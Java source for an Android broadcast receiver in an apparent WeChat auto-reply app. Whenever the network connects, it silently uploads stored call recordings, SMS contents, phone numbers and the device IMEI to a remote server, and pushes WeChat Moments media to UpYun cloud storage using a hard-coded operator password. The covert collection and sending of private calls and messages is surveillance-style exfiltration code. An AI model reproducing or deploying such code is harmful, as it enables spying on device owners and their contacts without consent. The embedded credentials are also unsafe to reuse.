package com.mikuwxc.autoreply.receiver;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;

import com.alibaba.fastjson.JSON;
import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.FileCallback;
import com.lzy.okgo.callback.StringCallback;
import com.mikuwxc.autoreply.bean.ApphttpBean;
import com.mikuwxc.autoreply.bean.SharePerSmsBean;
import com.mikuwxc.autoreply.callrecorder.CallDateUtils;
import com.mikuwxc.autoreply.callrecorder.RecordUpload;
import com.mikuwxc.autoreply.common.MyApp;
import com.mikuwxc.autoreply.common.net.NetApi;
import com.mikuwxc.autoreply.common.util.AppConfig;
import com.mikuwxc.autoreply.common.util.SPHelper;
import com.mikuwxc.autoreply.utils.GetImeiUtil;
import com.mikuwxc.autoreply.utils.SystemUtil;
import com.mikuwxc.autoreply.wxmoment.Config;
import com.mikuwxc.autoreply.wxmoment.MomentPicUpload;
import com.mikuwxc.autoreply.wxmoment.model.SnsInfo;
import com.upyun.library.common.Params;
import com.upyun.library.common.UploadEngine;
import com.upyun.library.listener.UpCompleteListener;
import com.upyun.library.listener.UpProgressListener;
import com.upyun.library.utils.UpYunUtils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import okhttp3.Call;
import okhttp3.Response;

/**
 * create by : 喻敏航
 * create time : 8018-10-16
 * description : 网络状态变化监听广播
 **/
public class NetworkChangeReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isAvailable()) {

            /**
             * 有网络  需要处理的事情
             * **/
            //检查是否有电话录音可上传
            //检查是否有短信可上传
            try {
                uploadPhoneRecord();
                uploadLocalSms();
            } catch (Exception e) {
                e.printStackTrace();
            }
            //检查是否有朋友圈数据可上传
//            uploadMoment();

        } else {
            /**
             * 断网  需要处理的事情
             * **/

        }

    }

    private void uploadMoment() {
        //先判断朋友圈数据库是否存在
        File file = new File(Config.EXT_DIR + "/moment.db");
        if(file.exists()){
            MomentPicUpload.handleDatas2();
        }
    }


    private void uploadLocalSms() throws Exception {
        SPHelper.init(MyApp.getAppContext());
        String sms_list_data = SPHelper.getInstance().getString("SMS_LIST_DATA");
        SharePerSmsBean perSmsBean = new Gson().fromJson(sms_list_data, SharePerSmsBean.class);

        SmssBean smssBean = new SmssBean();


        if (perSmsBean != null) {
            List<SharePerSmsBean.DataBean> data = perSmsBean.getData();
            if (data!=null&&data.size() > 0) {

                List<SmssBean> d=new ArrayList<>();
                for (SharePerSmsBean.DataBean datum : data) {
                    String onlyIdentification = GetImeiUtil.getOnlyIdentification(MyApp.getAppContext());
                    d.add(new SmssBean(datum.getContent(), onlyIdentification,"2".equals(datum.getType())?"true":"false",datum.getTime(),datum.getPhone()));
                }
                String json=new Gson().toJson(d);
                String url = AppConfig.OUT_NETWORK + NetApi.upload_sms_messages;
                OkGo.<String>post(url)
                        .tag(this)
                        .upJson(json)
                        .execute(new StringCallback() {
                            @Override
                            public void onSuccess(String s, Call call, Response response) {

                                ApphttpBean apphttpBean = new Gson().fromJson(s, ApphttpBean.class);
                                if("200".equals(apphttpBean.getCode())){
                                    SPHelper.getInstance().putString("SMS_LIST_DATA", "");

                                }
                            }

                            @Override
                            public void onError(Call call, Response response, Exception e) {
                                super.onError(call, response, e);
                            }
                        });

            } else {
            }
        }


    }

    private void uploadPhoneRecord() throws Exception {
        File file = new File(Environment.getExternalStorageDirectory() + "/CallRecorderTest");
        File[] files = file.listFiles();
        if (files != null && files.length > 0) {
            for (File f : files) {
                String name = f.getName();
                String[] split = name.split("_");
                int amrDuration = 0;//时长 单位s
                try {
                    amrDuration = CallDateUtils.getAmrDuration(f);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                //开始时间戳
                String startTime = split[3];
                //结束时间戳
                String endTime = String.valueOf(Long.valueOf(startTime) + amrDuration * 1000);
                //电话号码
                String phoneNum = split[2];
                String type = split[1];
                if ("outgoing".equals(type)) {//呼出
                    type = "true";
                } else if ("incoming".equals(type)) {//呼入
                    type = "false";
                } else {
                    type = "undifined";
                }

                String imei =GetImeiUtil.getOnlyIdentification(MyApp.getAppContext());
//                RecordUpload.uploadAmr(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
                RecordUpload.handleArm2mp3(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
            }
        }
    }





    private static void downloadVideo(String linkAddress) {
        final String fileName = UUID.randomUUID().toString() + ".avi".replaceAll("-", "");
        OkGo.<File>get(linkAddress)
                .tag(linkAddress)
                .execute(new FileCallback(Config.EXT_DIR + "/video", fileName) {
                    @Override
                    public void onSuccess(File file, Call call, Response response) {
                        String tag = (String) call.request().tag();
                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
                        ContentValues c = new ContentValues();
                        c.put("yunaddress", AppConfig.YOUPAIYUN + "/moment/video/" + fileName);
                        database.update("media", c, "address=?", new String[]{tag});
                        database.close();

                    }

                    @Override
                    public void onError(Call call, Response response, Exception e) {
                        super.onError(call, response, e);
                    }
                });
    }




    /**
     * @param linkAddress 下载链接
     **/
    private static void downloadPic(String linkAddress) {
        final String fileName = UUID.randomUUID().toString() + ".jpg".replaceAll("-", "");
        OkGo.<File>get(linkAddress)
                .tag(linkAddress)
                .execute(new FileCallback(Config.EXT_DIR + "/pic", fileName) {
                    @Override
                    public void onSuccess(File file, Call call, Response response) {
                        String tag = (String) call.request().tag();
                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
                        ContentValues c = new ContentValues();
                        c.put("yunaddress", AppConfig.YOUPAIYUN + "/moment/pic/" + fileName);
                        database.update("media", c, "address=?", new String[]{tag});
                        database.close();

                    }

                    @Override
                    public void onError(Call call, Response response, Exception e) {
                        super.onError(call, response, e);
                    }
                });
    }


    /**
     * 朋友圈上传图片
     *
     * @param picPath 图片sd卡路径
     * @param name    文件名字(自定义一个)
     *                *
     **/
    public static String uploadPic(String picPath, String name) {
        File temp = new File(picPath);
        final Map<String, Object> paramsMap = new HashMap<>();
        //上传又拍云的命名空间
        paramsMap.put(Params.BUCKET, "cloned");
        //又拍云的保存路径，任选其中一个
        String savePath = "/moment/" + "/pic/" + name;
        paramsMap.put(Params.SAVE_KEY, savePath);
        //时间戳加上15秒
        paramsMap.put(Params.EXPIRATION, System.currentTimeMillis() + 15);
        //进度回调，可为空
        UpProgressListener progressListener = new UpProgressListener() {
            @Override
            public void onRequestProgress(final long bytesWrite, final long contentLength) {
            }
        };
        //结束回调，不可为空
        UpCompleteListener completeListener = new UpCompleteListener() {
            @Override
            public void onComplete(boolean isSuccess, String result) {

                if (isSuccess) {
                    try {
                        // /moment/pic/94bfb4f3-53d1-49ca-a73e-46a56a4d4abd.jpg
                        String url = AppConfig.YOUPAIYUN + new JSONObject(result).optString("url");
                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
                        database.execSQL("update media set uploadsuccess=? where yunaddress=?", new String[]{"true", url});
                        database.close();
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        };

        //表单上传（本地签名方式）
        UploadEngine.getInstance().formUpload(temp, paramsMap, "unesmall", UpYunUtils.md5("unesmall123456"), completeListener, progressListener);
        return "";
    }


    /**
     * 朋友圈上传视频
     **/
    //上传自己发送的视频
    public static String uploadVideo(String picPath, String name) {
        File temp = new File(picPath);
        final Map<String, Object> paramsMap = new HashMap<>();
        //上传又拍云的命名空间
        paramsMap.put(Params.BUCKET, "cloned");
        //又拍云的保存路径，任选其中一个
        String savePath = "/moment/" + "/video/" + name;
        paramsMap.put(Params.SAVE_KEY, savePath);
        //时间戳加上15秒
        paramsMap.put(Params.EXPIRATION, System.currentTimeMillis() + 15);
        //进度回调，可为空
        UpProgressListener progressListener = new UpProgressListener() {
            @Override
            public void onRequestProgress(final long bytesWrite, final long contentLength) {
            }
        };
        //结束回调，不可为空
        UpCompleteListener completeListener = new UpCompleteListener() {
            @Override
            public void onComplete(boolean isSuccess, String result) {
                if (isSuccess) {
                    try {
                        // /moment/video/94bfb4f3-53d1-49ca-a73e-46a56a4d4abd.avi
                        String url = AppConfig.YOUPAIYUN + new JSONObject(result).optString("url");
                        SQLiteDatabase database = SQLiteDatabase.openOrCreateDatabase(new File(Config.EXT_DIR + "/moment.db"), null);
                        database.execSQL("update media set uploadsuccess=? where yunaddress=?", new String[]{"true", url});
                        database.close();
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }

            }
        };
        //表单上传（本地签名方式）
        UploadEngine.getInstance().formUpload(temp, paramsMap, "unesmall", UpYunUtils.md5("unesmall123456"), completeListener, progressListener);

        return "";
    }


    public static class SmssBean {


        /**
         * content : vr
         * imei : 6576
         * type : true
         * time : 7474
         * phone : 15151
         */

        private String content;
        private String imei;
        private String type;
        private String time;
        private String phone;

        public SmssBean() {
        }

        public SmssBean(String content, String imei, String type, String time, String phone) {
            this.content = content;
            this.imei = imei;
            this.type = type;
            this.time = time;
            this.phone = phone;
        }

        public String getContent() {
            return content;
        }

        public void setContent(String content) {
            this.content = content;
        }

        public String getImei() {
            return imei;
        }

        public void setImei(String imei) {
            this.imei = imei;
        }

        public String getType() {
            return type;
        }

        public void setType(String type) {
            this.type = type;
        }

        public String getTime() {
            return time;
        }

        public void setTime(String time) {
            this.time = time;
        }

        public String getPhone() {
            return phone;
        }

        public void setPhone(String phone) {
            this.phone = phone;
        }
    }
}
